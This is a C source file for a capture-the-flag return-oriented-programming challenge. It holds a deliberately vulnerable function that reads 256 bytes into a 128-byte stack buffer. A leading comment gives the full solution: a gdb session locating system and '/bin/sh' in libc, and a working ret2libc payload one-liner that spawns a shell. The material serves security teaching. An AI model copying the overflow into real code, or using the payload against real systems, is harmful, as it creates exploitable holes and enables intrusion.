/*** 
** Solution
** user4320@shell:/problems/ROP_3_7f3312fe43c46d26$ gdb rop3
** Reading symbols from /problems/ROP_3_7f3312fe43c46d26/rop3...(no debugging symbols found)...done.
** (gdb) b main
** Breakpoint 1 at 0x80484c9
** (gdb) r
** Starting program: /problems/ROP_3_7f3312fe43c46d26/rop3
** 
** Breakpoint 1, 0x080484c9 in main ()
** (gdb) print system
** $1 = {<text variable, no debug info>} 0xf7e68250 <system>
** 
** the address of the function system (into libc) is at 0xf7e68250
**
** (gdb) find &system, 0xFFFFFFFF, "/bin/sh"
** 0xf7f87a2c
** warning: Unable to access target memory at 0xf7fcdf34, halting search.
** 1 pattern found.
** 
**  the address of the string "/bin/sh" (into libc) is at 0xf7f87a2c
**
** user4320@shell:/problems/ROP_3_7f3312fe43c46d26$ cat <(perl -e 'print "A"x140 . "\x50\x82\xe6\xf7" . "AAAA" . "\x2c\x7a\xf8\xf7"') - | ./rop3
***
*/

#undef _FORTIFY_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vulnerable_function()  {
	char buf[128];
	read(STDIN_FILENO, buf,256);
}

void be_nice_to_people() {
	// /bin/sh is usually symlinked to bash, which usually drops privs. Make
	// sure we don't drop privs if we exec bash, (ie if we call system()).
	gid_t gid = getegid();
	setresgid(gid, gid, gid);
}

int main(int argc, char** argv) {
  be_nice_to_people();
	vulnerable_function();
	write(STDOUT_FILENO, "Hello, World\n", 13);
}
